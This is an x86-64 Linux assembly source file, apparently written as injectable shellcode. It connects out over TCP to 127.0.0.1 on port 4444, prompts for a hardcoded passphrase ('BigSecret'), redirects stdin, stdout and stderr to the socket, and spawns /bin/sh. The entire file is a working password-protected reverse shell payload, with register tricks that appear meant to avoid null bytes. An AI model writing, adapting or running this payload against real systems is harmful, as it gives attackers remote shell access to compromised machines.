global _start
section .text

_start:
	mov rbp, rsp
	jmp short _strdata 	; Find address of string list
	
_getref:	; Keep reference to strings
	pop r15
	jmp short _main

_strdata:
	call _getref		; Push RIP onto stack
	prompt: db "?", 0xa
	pass:	db "BigSecret"
	good:	db "OK", 0xa

_exit:		; exit nicely
	xor rax, rax
	push rax
	pop rbx
	add al, 0x3c
	inc ebx
	mov rsp, rbp
	syscall	

_prompt:	; send string to a socket, RSI and RDX populated before call	
	mov rdi, [rbp-24]
	xor rax, rax	
	mov r10, rax	; Zero unused params
	mov r8, rax
	mov r9, rax	
	add al, 44	; sys_sendto
	syscall
	ret
		
_main:
; Build a server sockaddr_in struct on the stack
	xor rax, rax
	push rax
	inc eax
	shl eax, 24
	add al, 0x7f
	shl rax, 16
	add ax, 0x5c11
	shl rax, 16
	add al, 2
	push rax
	
; Create Socket	
	xor rdi, rdi
	push rdi
	push rdi
	pop rax
	pop rdx
	inc edi
	push rdi
	pop rsi				; SOCK_STREAM (1)
	inc edi				; AF_INET (2)
	add al, 41	  	    ; syscall 41
	syscall
	cmp rax, -1
	jle _exit
	push rax 	  	    ; store socket id on stack
	
; Connect to remote host
	pop rdi
	push rdi            ; socket id
	lea rsi, [rbp-16]   ; sockaddr struct
	xor rdx, rdx
	push rdx
	pop rax
	add dl, 16
	add al, 42
	syscall

; Send message
	mov rsi, r15		; string address
	xor rdx, rdx
	add edx, 2          ; string length
	call _prompt
	
; Listen for response
	pop rdi
	push rdi            ; socket id
	lea rsi, [rbp-16]	; buffer address
	xor rax, rax 		; Zero out registers
	push rax
	push rax
	pop rdx
	pop r10
	mov r8, rax
	mov r9, rax	
	add edx, 9		; buffer length
	add al, 45		; recvfrom
	syscall
	
; Check for correct pass phrase
	lea rsi, [rbp-16]	; input buffer address
	lea rdi, [r15+2]	; password string address
	xor rcx, rcx
	add ecx, 8		; length
_cmploop:
	cmpsb			; compare bytes
	jne _exit		; exit if no match
	loop _cmploop   ; next char	

; good passphrase (fallthrough)
	lea rsi, [r15+11]	; OK string
	xor rdx, rdx
	add edx, 3		; welcome length
	call _prompt

; Duplicate I/O descriptors
	xor rax, rax 
	add al, 33		; dup2		
	mov r8, rax
	pop rdi
	push rdi            ; socket id
	xor rsi, rsi		; STDIN
	syscall 

	mov rax, r8		; dup2
	inc esi			; STDOUT
	syscall

	mov rax, r8		; dup2
	inc esi			; STDERR
	syscall
	
_spawn:
	xor rax, rax
	push rax
	pop rdx			; less instructions than MOV
	mov rbx, 0x68732f6e69622f78 ; build X/bin/sh
	shr rbx, 8		; shift the ¨X¨ and append a NULL
	mov [rbp-16], rbx	; copy ¨/bin/sh¨ string to buffer
	lea rdi, [rbp-16] 	; get the /bin/sh string
	push rax		; build args array, by pushing NULL
	push rdi		; then pushing string address
	mov rsi, rsp		; args array address
	add al, 59		; execve
	syscall
	call _exit	
	
	
	
